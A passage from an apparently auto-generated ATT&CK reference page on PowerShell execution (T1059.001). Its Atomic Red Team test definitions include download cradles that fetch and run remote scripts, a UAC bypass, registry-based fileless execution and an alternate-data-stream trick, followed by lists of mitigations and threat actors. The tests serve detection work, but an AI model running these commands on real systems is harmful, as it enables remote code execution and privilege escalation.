                                                                                                            'Upon '
                                                                                                            'execution '
                                                                                                            'windows '
                                                                                                            'backup '
                                                                                                            'and '
                                                                                                            'restore '
                                                                                                            'window '
                                                                                                            'will '
                                                                                                            'be '
                                                                                                            'opened.\n'
                                                                                                            '\n'
                                                                                                            'Bypass '
                                                                                                            'is '
                                                                                                            'based '
                                                                                                            'on: '
                                                                                                            'https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\n',
                                                                                             'executor': {'command': 'Powershell.exe '
                                                                                                                     '"IEX '
                                                                                                                     '(New-Object '
                                                                                                                     "Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); "
                                                                                                                     'Invoke-AppPathBypass '
                                                                                                                     '-Payload '
                                                                                                                     '\'C:\\Windows\\System32\\cmd.exe\'"\n',
                                                                                                          'name': 'command_prompt'},
                                                                                             'name': 'Invoke-AppPathBypass',
                                                                                             'supported_platforms': ['windows']},
                                                                                            {'auto_generated_guid': '388a7340-dbc1-4c9d-8e59-b75ad8c6d5da',
                                                                                             'description': 'Powershell '
                                                                                                            'MsXml '
                                                                                                            'COM '
                                                                                                            'object. '
                                                                                                            'Not '
                                                                                                            'proxy '
                                                                                                            'aware, '
                                                                                                            'removing '
                                                                                                            'cache '
                                                                                                            'although '
                                                                                                            'does '
                                                                                                            'not '
                                                                                                            'appear '
                                                                                                            'to '
                                                                                                            'write '
                                                                                                            'to '
                                                                                                            'those '
                                                                                                            'locations. '
                                                                                                            'Upon '
                                                                                                            'execution, '
                                                                                                            '"Download '
                                                                                                            'Cradle '
                                                                                                            'test '
                                                                                                            'success!" '
                                                                                                            'will '
                                                                                                            'be '
                                                                                                            'displayed.\n'
                                                                                                            '\n'
                                                                                                            'Provided '
                                                                                                            'by '
                                                                                                            'https://github.com/mgreen27/mgreen27.github.io\n',
                                                                                             'executor': {'command': 'powershell.exe '
                                                                                                                     '-exec '
                                                                                                                     'bypass '
                                                                                                                     '-noprofile '
                                                                                                                     '"$comMsXml=New-Object '
                                                                                                                     '-ComObject '
                                                                                                                     "MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX "
                                                                                                                     '$comMsXml.ResponseText"\n',
                                                                                                          'name': 'command_prompt'},
                                                                                             'input_arguments': {'url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',
                                                                                                                         'description': 'url '
                                                                                                                                        'of '
                                                                                                                                        'payload '
                                                                                                                                        'to '
                                                                                                                                        'execute',
                                                                                                                         'type': 'url'}},
                                                                                             'name': 'Powershell '
                                                                                                     'MsXml '
                                                                                                     'COM '
                                                                                                     'object '
                                                                                                     '- '
                                                                                                     'with '
                                                                                                     'prompt',
                                                                                             'supported_platforms': ['windows']},
                                                                                            {'auto_generated_guid': '4396927f-e503-427b-b023-31049b9b09a6',
                                                                                             'description': 'Powershell '
                                                                                                            'xml '
                                                                                                            'download '
                                                                                                            'request. '
                                                                                                            'Upon '
                                                                                                            'execution, '
                                                                                                            '"Download '
                                                                                                            'Cradle '
                                                                                                            'test '
                                                                                                            'success!" '
                                                                                                            'will '
                                                                                                            'be '
                                                                                                            'dispalyed.\n'
                                                                                                            '\n'
                                                                                                            'Provided '
                                                                                                            'by '
                                                                                                            'https://github.com/mgreen27/mgreen27.github.io\n',
                                                                                             'executor': {'command': '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" '
                                                                                                                     '-exec '
                                                                                                                     'bypass '
                                                                                                                     '-noprofile '
                                                                                                                     '"$Xml '
                                                                                                                     '= '
                                                                                                                     '(New-Object '
                                                                                                                     "System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute "
                                                                                                                     '| '
                                                                                                                     'IEX"\n',
                                                                                                          'name': 'command_prompt'},
                                                                                             'input_arguments': {'url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml',
                                                                                                                         'description': 'url '
                                                                                                                                        'of '
                                                                                                                                        'payload '
                                                                                                                                        'to '
                                                                                                                                        'execute',
                                                                                                                         'type': 'url'}},
                                                                                             'name': 'Powershell '
                                                                                                     'XML '
                                                                                                     'requests',
                                                                                             'supported_platforms': ['windows']},
                                                                                            {'auto_generated_guid': '8a2ad40b-12c7-4b25-8521-2737b0a415af',
                                                                                             'description': 'Powershell '
                                                                                                            'invoke '
                                                                                                            'mshta '
                                                                                                            'to '
                                                                                                            'download '
                                                                                                            'payload. '
                                                                                                            'Upon '
                                                                                                            'execution, '
                                                                                                            'a '
                                                                                                            'new '
                                                                                                            'PowerShell '
                                                                                                            'window '
                                                                                                            'will '
                                                                                                            'be '
                                                                                                            'opened '
                                                                                                            'which '
                                                                                                            'will '
                                                                                                            'display '
                                                                                                            '"Download '
                                                                                                            'Cradle '
                                                                                                            'test '
                                                                                                            'success!".\n'
                                                                                                            '\n'
                                                                                                            'Provided '
                                                                                                            'by '
                                                                                                            'https://github.com/mgreen27/mgreen27.github.io\n',
                                                                                             'executor': {'command': 'C:\\Windows\\system32\\cmd.exe '
                                                                                                                     '/c '
                                                                                                                     '"mshta.exe '
                                                                                                                     'javascript:a=GetObject(\'script:#{url}\').Exec();close()"\n',
                                                                                                          'name': 'command_prompt'},
                                                                                             'input_arguments': {'url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct',
                                                                                                                         'description': 'url '
                                                                                                                                        'of '
                                                                                                                                        'payload '
                                                                                                                                        'to '
                                                                                                                                        'execute',
                                                                                                                         'type': 'url'}},
                                                                                             'name': 'Powershell '
                                                                                                     'invoke '
                                                                                                     'mshta.exe '
                                                                                                     'download',
                                                                                             'supported_platforms': ['windows']},
                                                                                            {'auto_generated_guid': 'cc50fa2a-a4be-42af-a88f-e347ba0bf4d7',
                                                                                             'description': 'Provided '
                                                                                                            'by '
                                                                                                            'https://github.com/mgreen27/mgreen27.github.io\n'
                                                                                                            'Invoke-DownloadCradle '
                                                                                                            'is '
                                                                                                            'used '
                                                                                                            'to '
                                                                                                            'generate '
                                                                                                            'Network '
                                                                                                            'and '
                                                                                                            'Endpoint '
                                                                                                            'artifacts.\n',
                                                                                             'executor': {'name': 'manual',
                                                                                                          'steps': '1. '
                                                                                                                   'Open '
                                                                                                                   'Powershell_ise '
                                                                                                                   'as '
                                                                                                                   'a '
                                                                                                                   'Privileged '
                                                                                                                   'Account\n'
                                                                                                                   '2. '
                                                                                                                   'Invoke-DownloadCradle.ps1\n'},
                                                                                             'name': 'Powershell '
                                                                                                     'Invoke-DownloadCradle',
                                                                                             'supported_platforms': ['windows']},
                                                                                            {'auto_generated_guid': 'fa050f5e-bc75-4230-af73-b6fd7852cd73',
                                                                                             'description': 'Execution '
                                                                                                            'of '
                                                                                                            'a '
                                                                                                            'PowerShell '
                                                                                                            'payload '
                                                                                                            'from '
                                                                                                            'the '
                                                                                                            'Windows '
                                                                                                            'Registry '
                                                                                                            'similar '
                                                                                                            'to '
                                                                                                            'that '
                                                                                                            'seen '
                                                                                                            'in '
                                                                                                            'fileless '
                                                                                                            'malware '
                                                                                                            'infections. '
                                                                                                            'Upon '
                                                                                                            'exection, '
                                                                                                            'open '
                                                                                                            '"C:\\Windows\\Temp" '
                                                                                                            'and '
                                                                                                            'verify '
                                                                                                            'that\n'
                                                                                                            'art-marker.txt '
                                                                                                            'is '
                                                                                                            'in '
                                                                                                            'the '
                                                                                                            'folder.\n',
                                                                                             'executor': {'cleanup_command': 'Remove-Item '
                                                                                                                             '-path '
                                                                                                                             'C:\\Windows\\Temp\\art-marker.txt '
                                                                                                                             '-Force '
                                                                                                                             '-ErrorAction '
                                                                                                                             'Ignore\n'
                                                                                                                             'Remove-Item '
                                                                                                                             'HKCU:\\Software\\Classes\\AtomicRedTeam '
                                                                                                                             '-Force '
                                                                                                                             '-ErrorAction '
                                                                                                                             'Ignore\n',
                                                                                                          'command': '# '
                                                                                                                     'Encoded '
                                                                                                                     'payload '
                                                                                                                     'in '
                                                                                                                     'next '
                                                                                                                     'command '
                                                                                                                     'is '
                                                                                                                     'the '
                                                                                                                     'following '
                                                                                                                     '"Set-Content '
                                                                                                                     '-path '
                                                                                                                     '"$env:SystemRoot/Temp/art-marker.txt" '
                                                                                                                     '-value '
                                                                                                                     '"Hello '
                                                                                                                     'from '
                                                                                                                     'the '
                                                                                                                     'Atomic '
                                                                                                                     'Red '
                                                                                                                     'Team""\n'
                                                                                                                     'reg.exe '
                                                                                                                     'add '
                                                                                                                     '"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam" '
                                                                                                                     '/v '
                                                                                                                     'ART '
                                                                                                                     '/t '
                                                                                                                     'REG_SZ '
                                                                                                                     '/d '
                                                                                                                     '"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="\n'
                                                                                                                     'iex '
                                                                                                                     '([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp '
                                                                                                                     "'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n",
                                                                                                          'elevation_required': True,
                                                                                                          'name': 'powershell'},
                                                                                             'name': 'PowerShell '
                                                                                                     'Fileless '
                                                                                                     'Script '
                                                                                                     'Execution',
                                                                                             'supported_platforms': ['windows']},
                                                                                            {'auto_generated_guid': '9148e7c4-9356-420e-a416-e896e9c0f73e',
                                                                                             'dependencies': [{'description': 'PowerShell '
                                                                                                                              'version '
                                                                                                                              '2 '
                                                                                                                              'must '
                                                                                                                              'be '
                                                                                                                              'installed\n',
                                                                                                               'get_prereq_command': 'Write-Host  '
                                                                                                                                     'Automated '
                                                                                                                                     'installer '
                                                                                                                                     'not '
                                                                                                                                     'implemented '
                                                                                                                                     'yet, '
                                                                                                                                     'please '
                                                                                                                                     'install '
                                                                                                                                     'PowerShell '
                                                                                                                                     'v2 '
                                                                                                                                     'manually\n',
                                                                                                               'prereq_command': 'if(2 '
                                                                                                                                 '-in '
                                                                                                                                 '$PSVersionTable.PSCompatibleVersions.Major) '
                                                                                                                                 '{exit '
                                                                                                                                 '0} '
                                                                                                                                 'else '
                                                                                                                                 '{exit '
                                                                                                                                 '1}\n'}],
                                                                                             'description': 'This '
                                                                                                            'test '
                                                                                                            'requires '
                                                                                                            'the '
                                                                                                            'manual '
                                                                                                            'installation '
                                                                                                            'of '
                                                                                                            'PowerShell '
                                                                                                            'V2.\n'
                                                                                                            '\n'
                                                                                                            'Attempts '
                                                                                                            'to '
                                                                                                            'run '
                                                                                                            'powershell '
                                                                                                            'commands '
                                                                                                            'in '
                                                                                                            'version '
                                                                                                            '2.0 '
                                                                                                            'https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n',
                                                                                             'executor': {'command': 'powershell.exe '
                                                                                                                     '-version '
                                                                                                                     '2 '
                                                                                                                     '-Command '
                                                                                                                     'Write-Host '
                                                                                                                     '$PSVersion\n',
                                                                                                          'name': 'powershell'},
                                                                                             'name': 'PowerShell '
                                                                                                     'Downgrade '
                                                                                                     'Attack',
                                                                                             'supported_platforms': ['windows']},
                                                                                            {'auto_generated_guid': '8e5c5532-1181-4c1d-bb79-b3a9f5dbd680',
                                                                                             'dependencies': [{'description': 'Homedrive '
                                                                                                                              'must '
                                                                                                                              'be '
                                                                                                                              'an '
                                                                                                                              'NTFS '
                                                                                                                              'drive\n',
                                                                                                               'get_prereq_command': 'Write-Host '
                                                                                                                                     "Prereq's "
                                                                                                                                     'for '
                                                                                                                                     'this '
                                                                                                                                     'test '
                                                                                                                                     'cannot '
                                                                                                                                     'be '
                                                                                                                                     'met '
                                                                                                                                     'automatically\n',
                                                                                                               'prereq_command': 'if((Get-Volume '
                                                                                                                                 '-DriveLetter '
                                                                                                                                 '$env:HOMEDRIVE[0]).FileSystem '
                                                                                                                                 '-contains '
                                                                                                                                 '"NTFS") '
                                                                                                                                 '{exit '
                                                                                                                                 '0} '
                                                                                                                                 'else '
                                                                                                                                 '{exit '
                                                                                                                                 '1}\n'}],
                                                                                             'description': 'Creates '
                                                                                                            'a '
                                                                                                            'file '
                                                                                                            'with '
                                                                                                            'an '
                                                                                                            'alternate '
                                                                                                            'data '
                                                                                                            'stream '
                                                                                                            'and '
                                                                                                            'simulates '
                                                                                                            'executing '
                                                                                                            'that '
                                                                                                            'hidden '
                                                                                                            'code/file. '
                                                                                                            'Upon '
                                                                                                            'execution, '
                                                                                                            '"Stream '
                                                                                                            'Data '
                                                                                                            'Executed" '
                                                                                                            'will '
                                                                                                            'be '
                                                                                                            'displayed.\n',
                                                                                             'executor': {'cleanup_command': 'Remove-Item '
                                                                                                                             '#{ads_file} '
                                                                                                                             '-Force '
                                                                                                                             '-ErrorAction '
                                                                                                                             'Ignore\n',
                                                                                                          'command': 'Add-Content '
                                                                                                                     '-Path '
                                                                                                                     '#{ads_file} '
                                                                                                                     '-Value '
                                                                                                                     "'Write-Host "
                                                                                                                     '"Stream '
                                                                                                                     'Data '
                                                                                                                     'Executed"\' '
                                                                                                                     '-Stream '
                                                                                                                     "'streamCommand'\n"
                                                                                                                     '$streamcommand '
                                                                                                                     '= '
                                                                                                                     'Get-Content '
                                                                                                                     '-Path '
                                                                                                                     '#{ads_file} '
                                                                                                                     '-Stream '
                                                                                                                     "'streamcommand'\n"
                                                                                                                     'Invoke-Expression '
                                                                                                                     '$streamcommand\n',
                                                                                                          'name': 'powershell'},
                                                                                             'input_arguments': {'ads_file': {'default': '$env:TEMP\\NTFS_ADS.txt',
                                                                                                                              'description': 'File '
                                                                                                                                             'created '
                                                                                                                                             'to '
                                                                                                                                             'store '
                                                                                                                                             'Alternate '
                                                                                                                                             'Stream '
                                                                                                                                             'Data',
                                                                                                                              'type': 'String'}},
                                                                                             'name': 'NTFS '
                                                                                                     'Alternate '
                                                                                                     'Data '
                                                                                                     'Stream '
                                                                                                     'Access',
                                                                                             'supported_platforms': ['windows']},
                                                                                            {'auto_generated_guid': '7c1acec2-78fa-4305-a3e0-db2a54cddecd',
                                                                                             'dependencies': [{'description': 'PSRemoting '
                                                                                                                              'must '
                                                                                                                              'be '
                                                                                                                              'enabled\n',
                                                                                                               'get_prereq_command': 'Enable-PSRemoting\n',
                                                                                                               'prereq_command': 'Try '
                                                                                                                                 '{\n'
                                                                                                                                 '    '
                                                                                                                                 'New-PSSession '
                                                                                                                                 '-ComputerName '
                                                                                                                                 '#{hostname_to_connect} '
                                                                                                                                 '-ErrorAction '
                                                                                                                                 'Stop '
                                                                                                                                 '| '
                                                                                                                                 'Out-Null\n'
                                                                                                                                 '    '
                                                                                                                                 'exit '
                                                                                                                                 '0\n'
                                                                                                                                 '} \n'
                                                                                                                                 'Catch '
                                                                                                                                 '{\n'
                                                                                                                                 '    '
                                                                                                                                 'exit '
                                                                                                                                 '1\n'
                                                                                                                                 '}\n'}],
                                                                                             'description': 'Connect '
                                                                                                            'to '
                                                                                                            'a '
                                                                                                            'remote '
                                                                                                            'powershell '
                                                                                                            'session '
                                                                                                            'and '
                                                                                                            'interact '
                                                                                                            'with '
                                                                                                            'the '
                                                                                                            'host.\n'
                                                                                                            'Upon '
                                                                                                            'execution, '
                                                                                                            'network '
                                                                                                            'test '
                                                                                                            'info '
                                                                                                            'and '
                                                                                                            "'T1086 "
                                                                                                            'PowerShell '
                                                                                                            'Session '
                                                                                                            'Creation '
                                                                                                            'and '
                                                                                                            "Use' "
                                                                                                            'will '
                                                                                                            'be '
                                                                                                            'displayed.\n',
                                                                                             'executor': {'command': 'New-PSSession '
                                                                                                                     '-ComputerName '
                                                                                                                     '#{hostname_to_connect}\n'
                                                                                                                     'Test-Connection '
                                                                                                                     '$env:COMPUTERNAME\n'
                                                                                                                     'Set-Content '
                                                                                                                     '-Path '
                                                                                                                     '$env:TEMP\\T1086_PowerShell_Session_Creation_and_Use '
                                                                                                                     '-Value '
                                                                                                                     '"T1086 '
                                                                                                                     'PowerShell '
                                                                                                                     'Session '
                                                                                                                     'Creation '
                                                                                                                     'and '
                                                                                                                     'Use"\n'
                                                                                                                     'Get-Content '
                                                                                                                     '-Path '
                                                                                                                     '$env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\n'
                                                                                                                     'Remove-Item '
                                                                                                                     '-Force '
                                                                                                                     '$env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\n',
                                                                                                          'elevation_required': True,
                                                                                                          'name': 'powershell'},
                                                                                             'input_arguments': {'hostname_to_connect': {'default': '$env:COMPUTERNAME',
                                                                                                                                         'description': 'The '
                                                                                                                                                        'host '
                                                                                                                                                        'to '
                                                                                                                                                        'connect '
                                                                                                                                                        'to, '
                                                                                                                                                        'by '
                                                                                                                                                        'default '
                                                                                                                                                        'it '
                                                                                                                                                        'will '
                                                                                                                                                        'connect '
                                                                                                                                                        'to '
                                                                                                                                                        'the '
                                                                                                                                                        'local '
                                                                                                                                                        'machine',
                                                                                                                                         'type': 'String'}},
                                                                                             'name': 'PowerShell '
                                                                                                     'Session '
                                                                                                     'Creation '
                                                                                                     'and '
                                                                                                     'Use',
                                                                                             'supported_platforms': ['windows']}],
                                                                           'attack_technique': 'T1059.001',
                                                                           'display_name': 'Command '
                                                                                           'and '
                                                                                           'Scripting '
                                                                                           'Interpreter: '
                                                                                           'PowerShell'}}]
```

# Tactics


* [Execution](../tactics/Execution.md)


# Mitigations


* [Code Signing](../mitigations/Code-Signing.md)

* [Privileged Account Management](../mitigations/Privileged-Account-Management.md)
    
* [Disable or Remove Feature or Program](../mitigations/Disable-or-Remove-Feature-or-Program.md)
    
* [Antivirus/Antimalware](../mitigations/Antivirus-Antimalware.md)
    

# Actors


* [APT32](../actors/APT32.md)

* [Turla](../actors/Turla.md)
    
* [APT29](../actors/APT29.md)
    
* [FIN10](../actors/FIN10.md)
    
* [FIN7](../actors/FIN7.md)
    
* [Poseidon Group](../actors/Poseidon-Group.md)
    
* [FIN6](../actors/FIN6.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [CopyKittens](../actors/CopyKittens.md)
    
* [APT19](../actors/APT19.md)
    
* [APT3](../actors/APT3.md)
    
* [Patchwork](../actors/Patchwork.md)
    
* [Stealth Falcon](../actors/Stealth-Falcon.md)
    
* [DarkHydrus](../actors/DarkHydrus.md)
    
* [APT28](../actors/APT28.md)
    
* [OilRig](../actors/OilRig.md)
    
* [Deep Panda](../actors/Deep-Panda.md)
    
* [TA459](../actors/TA459.md)
    
* [Thrip](../actors/Thrip.md)
    
* [Magic Hound](../actors/Magic-Hound.md)
    
* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
* [FIN8](../actors/FIN8.md)
    
* [menuPass](../actors/menuPass.md)
    
* [BRONZE BUTLER](../actors/BRONZE-BUTLER.md)
    
* [Gorgon Group](../actors/Gorgon-Group.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [Gallmaker](../actors/Gallmaker.md)
    
* [APT33](../actors/APT33.md)
    
* [TEMP.Veles](../actors/TEMP.Veles.md)
    
* [WIRTE](../actors/WIRTE.md)
    
* [TA505](../actors/TA505.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
* [Kimsuky](../actors/Kimsuky.md)
    
* [APT41](../actors/APT41.md)
    
* [Silence](../actors/Silence.md)
    
* [Inception](../actors/Inception.md)
    
* [Frankenstein](../actors/Frankenstein.md)
    
* [Wizard Spider](../actors/Wizard-Spider.md)
    
* [Molerats](../actors/Molerats.md)
    
* [DarkVishnya](../actors/DarkVishnya.md)
    
* [APT39](../actors/APT39.md)
    
* [Blue Mockingbird](../actors/Blue-Mockingbird.md)
    
